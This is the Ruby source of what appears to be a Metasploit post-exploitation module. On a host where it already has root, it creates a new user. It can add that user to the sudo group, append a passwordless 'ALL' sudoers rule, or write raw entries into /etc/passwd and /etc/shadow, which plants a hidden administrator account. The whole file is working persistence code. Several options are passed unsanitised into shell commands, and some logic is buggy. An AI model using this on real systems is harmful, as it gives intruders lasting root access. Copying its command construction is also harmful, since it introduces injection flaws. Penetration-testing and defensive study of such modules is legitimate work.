# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework

require 'unix_crypt'

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Unix
  include Msf::Post::Linux::System

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Add a new user to the system',
        'Description' => %q{
          This command adds a new user to the system
        },
        'License' => MSF_LICENSE,
        'Author' => ['Nick Cottrell <ncottrellweb[at]gmail.com>'],
        'Platform' => ['linux', 'unix', 'bsd', 'aix', 'solaris'],
        'Privileged' => false,
        'SessionTypes' => %w[meterpreter shell],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => []
        }
      )
    )
    register_options([
      OptString.new('USERNAME', [ true, 'The username to create', 'metasploit' ]),
      OptString.new('PASSWORD', [ true, 'The password for this user', 'Metasploit$1' ]),
      OptString.new('SHELL', [true, 'Set the shell that the new user will use', '/bin/sh']),
      OptString.new('HOME', [true, 'Set the home directory of the new user. Leave empty if user will have no home directory', '']),
      OptString.new('GROUPS', [false, 'Set what groups the new user will be part of separated with a space', ''])
    ])

    register_advanced_options([
      OptString.new('UseraddBinary', [false, 'Set binary used to set password if you dont want module to find it for you. Set this to \'MANUAL\' to run without binary', nil]),
      OptEnum.new('SudoMethod', [false, 'Set the method that the new user can obtain root. SUDO_FILE adds the user directly to sudoers while GROUP adds the new user to the sudo group', 'GROUP', ['SUDO_FILE', 'GROUP', 'NONE']]),
      OptEnum.new('MissingGroups', [true, 'Set how nonexisting groups are handled on the system. Either give an error in the module, ignore it and throw it out, or create the group on the system.', 'ERROR', ['ERROR', 'IGNORE', 'CREATE']]),
    ])
  end

  def check_group_exists?(group_name, group_data)
    return group_data =~ /^#{group_name}:/
  end

  def run
    fail_with(Failure::NoAccess, 'Session isnt running as root') unless is_root?
    fail_with(Failure::NotVulnerable, 'Cannot find a means to add a new user') unless datastore['UseraddBinary'] == 'MANUAL' || (datastore['UseraddBinary'] && command_exists?(datastore['UseraddBinary'])) || command_exists?('useradd') || command_exists?('adduser')
    fail_with(Failure::NotFound, "Cannot find command on path given: #{datastore['UseraddBinary']}") if datastore['UseraddBinary'] && !(datastore['UseraddBinary'] == 'MANUAL' || command_exists?(datastore['UseraddBinary']))
    fail_with(Failure::NotVulnerable, 'Cannot add user to sudo as sudoers doesnt exist') unless datastore['SudoMethod'] != 'SUDO_FILE' || file_exist?('/etc/sudoers')
    fail_with(Failure::NotFound, 'Shell specified does not exist on system') unless command_exists?(datastore['SHELL'])
    fail_with(Failure::BadConfig, "Username [#{datastore['USERNAME']}] is not a legal unix username.") unless datastore['USERNAME'] =~ /^[a-z][a-z0-9_-]{0,31}$/

    # Encrypting password ahead of time
    passwd = UnixCrypt::MD5.build(datastore['PASSWORD'])

    # Adding sudo to groups if method is set to use groups
    groups = datastore['GROUPS'].split
    groups += ['sudo'] if datastore['SudoMethod'] == 'GROUP'
    groups = groups.uniq
    groups_handled = false

    # Check to see that groups exist or fail
    group_file = read_file('/etc/group').to_s
    groups_missing = groups.reject { |group| check_group_exists?(group, group_file) }

    if datastore['MissingGroups'] == 'ERROR'
      fail_with(Failure::NotFound, "groups [#{groups_missing.join(' ')}] do not exist on the system")
    end
    vprint_bad("Groups [#{groups_missing.join(' ')}] do not exist on system")
    if datastore['MissingGroups'] == 'IGNORE'
      groups -= groups_missing
      vprint_good("Removed #{groups_missing.join(' ')} from target groups")
    end

    # Check database to see what OS it is. If it meets specific requirements, This can all be done in a single line
    binary =
      if datastore['UseraddBinary']
        datastore['UseraddBinary']
      elsif command_exists?('useradd')
        'useradd'
      elsif command_exists?('adduser')
        'adduser'
      else
        fail_with(Failure::NotFound, 'Cannot find a binary to add a new user cleanly')
      end
    os_platform =
      if session.type == 'meterpreter'
        sysinfo['OS']
      elsif active_db? && framework.db.workspace.hosts.where(address: session.session_host) && framework.db.workspace.hosts.where(address: session.session_host).first.os_name
        host = framework.db.workspace.hosts.where(address: session.session_host).first
        if host.os_name == 'linux' && host.os_flavor
          host.os_flavor
        else
          host.os_name
        end
      else
        get_sysinfo[:distro]
      end

    binary_case = if binary =~ /useradd$/
                    'useradd'
                  elsif binary =~ /adduser$/
                    'adduser'
                  else
                    binary end
    case binary_case
    when 'useradd'
      vprint_status("Running on #{os_platform}")
      vprint_status('Useradd exists. Using that')
      case os_platform
      when /debian|ubuntu|fedora|centos|oracle|redhat|arch|suse|gentoo/i
        homedirc = datastore['HOME'].empty? ? '--no-create-home' : "--home-dir #{datastore['HOME']}"

        # Since command can add on groups, checking over groups
        groupadd = ''
        if datastore['MissingGroups'] == 'CREATE'
          groupadd = command_exists?('groupadd') ? 'groupadd' : 'addgroup'

          groups_missing.each do |group|
            cmd_exec("#{groupadd} #{group}")
            vprint_good("Added #{group} group")
          end
        end
        groupsc = groups.empty? ? '' : "--groups #{groups.join(',')}"

        # Finally run it
                  # useradd
        command = "#{binary} --password #{passwd} #{homedirc} #{groupsc} --shell #{datastore['SHELL']} --no-log-init #{datastore['USERNAME']}".gsub(/ {2,}/, ' ')
        vprint_status(command)
        vprint_line(cmd_exec(command))
        groups_handled = true
      else
        vprint_status('Unsure what platform were on. Using useradd in most basic/common settings')

        # Finally run it
                  # useradd
        command = "#{binary} #{datastore['USERNAME']} | echo"
        vprint_status(command)
        vprint_status(cmd_exec(command))
        vprint_status(cmd_exec("echo \'#{datastore['USERNAME']}:#{passwd}\'|chpasswd -e"))
      end
    when 'adduser'
      vprint_status("Running on #{os_platform}")
      vprint_status('Adduser exists. Using that')
      case os_platform
      when /debian|ubuntu/i
        vprint_bad('Adduser cannot add groups to the new user automatically. Going to have to do it at a later step')
        homedirc = datastore['HOME'].empty? ? '--no-create-home' : "--home #{datastore['HOME']}"

                  # adduser
        command = "#{binary} --disabled-password #{homedirc} --shell #{datastore['SHELL']} #{datastore['USERNAME']} | echo"
        vprint_status(command)
        vprint_status(cmd_exec(command))
        vprint_status(cmd_exec("echo \'#{datastore['USERNAME']}:#{passwd}\'|chpasswd -e"))
      when /fedora|centos|oracle|redhat/i
        vprint_status('Adduser exists. Using that')
        homedirc = datastore['HOME'].empty? ? '--no-create-home' : "--home-dir #{datastore['HOME']}"

        # Since command can add on groups, checking over groups
        groupadd = ''
        if datastore['MissingGroups'] == 'CREATE'
          groupadd = command_exists?('groupadd') ? 'groupadd' : 'addgroup'

          groups_missing.each do |group|
            cmd_exec("#{groupadd} #{group}")
            vprint_good("Added #{group} group")
          end
        end
        groupsc = groups.empty? ? '' : "--groups #{groups.join(',')}"

        # Finally run it
                  # adduser
        command = "#{binary} --password #{passwd} #{homedirc} #{groupsc} --shell #{datastore['SHELL']} --no-log-init #{datastore['USERNAME']}".gsub(/ {2,}/, ' ')
        vprint_status(command)
        vprint_status(cmd_exec(command))
        groups_handled = true
      when /alpine/i
        vprint_bad('Adduser cannot add groups to the new user automatically. Going to have to do it at a later step')
        homedirc = datastore['HOME'].empty? ? '-H' : "-h #{datastore['HOME']}"

                  # adduser
        command = "#{binary} -D #{homedirc} -s #{datastore['SHELL']} #{datastore['USERNAME']}"
        vprint_status(command)
        vprint_status(cmd_exec(command))
        vprint_status(cmd_exec("echo \'#{datastore['USERNAME']}:#{passwd}\'|chpasswd -e"))
      else
        vprint_status('Unsure what platform were on. Using useradd in most basic/common settings')

        # Finally run it
                  # adduser
        command = "#{binary} #{datastore['USERNAME']}"
        vprint_status(command)
        vprint_status(cmd_exec(command))
        vprint_status(cmd_exec("echo \'#{datastore['USERNAME']}:#{passwd}\'|chpasswd -e"))
      end
    when binary != 'MANUAL' ? datastore['UseraddBinary'] : ''
      print_status('Running with command supplied')
      command = "#{binary} #{datastore['USERNAME']}"
      vprint_status(command)
      vprint_status(cmd_exec(command))
      vprint_status(cmd_exec("echo \'#{datastore['USERNAME']}:#{passwd}\'|chpasswd -e"))
    else
      # Run adding user manually if set
      home = datastore['HOME'].empty? ? "/home/#{datastore['USERNAME']}" : datastore['HOME']
      uid = rand(1000..2000).to_s
      vprint_status(cmd_exec("echo \'#{datastore['USERNAME']}:x:#{uid}:#{uid}::#{home}:#{datastore['SHELL']}\' >> /etc/passwd"))
      vprint_status(cmd_exec("echo \'#{datastore['USERNAME']}:#{passwd}::0:99999:7:::\' >> /etc/shadow")) # TODO: Finalize this line
      group_file_save = group_file

      groups.select do |group|
        group_file = group_file.gsub(/^(#{group}:[^:]*:[0-9]+:.+)$/, "\\1,#{datastore['USERNAME']}").gsub(/^(#{group}:[^:]*:[0-9]+:)$/, "\\1#{datastore['USERNAME']}")
      end
      if datastore['MissingGroups'] == 'CREATE'
        groups_missing.each do |group|
          group_file += "\n#{group}:x:#{datastore['USERNAME']}\n"
          vprint_good("Added #{group} group")
        end
      end
      group_file = group_file.gsub(/\n{2,}/, "\n")
      write_file('/etc/group', group_file) unless group_file == group_file_save

      groups_handled = true
    end

    # Adding in groups and connecting if not done already
    unless groups_handled
      # Since command can add on groups, checking over groups
      groupadd = ''
      if datastore['MissingGroups'] == 'CREATE'
        groupadd = command_exists?('groupadd') ? 'groupadd' : 'addgroup'

        groups_missing.each do |group|
          cmd_exec("#{groupadd} #{group}")
          vprint_good("Added #{group} group")
        end
      end

      # Attempt to do add groups to user by normal means, or do it manually
      if command_exists?('usermod')
        cmd_exec("usermod -aG #{groups.join(',')} #{datastore['USERNAME']}")
      elsif command_exists?('addgroup')
        groups.each do |group|
          cmd_exec("addgroup #{datastore['USERNAME']} #{group}")
        end
      end
    end

    # Adding user to sudo file if specified
    if datastore['SudoMethod'] == 'SUDO_FILE' && file_exist?('/etc/sudoers')
      append_file('/etc/sudoers', "#{datastore['USERNAME']} ALL=(ALL:ALL) NOPASSWD: ALL\n")
    end
  end
end
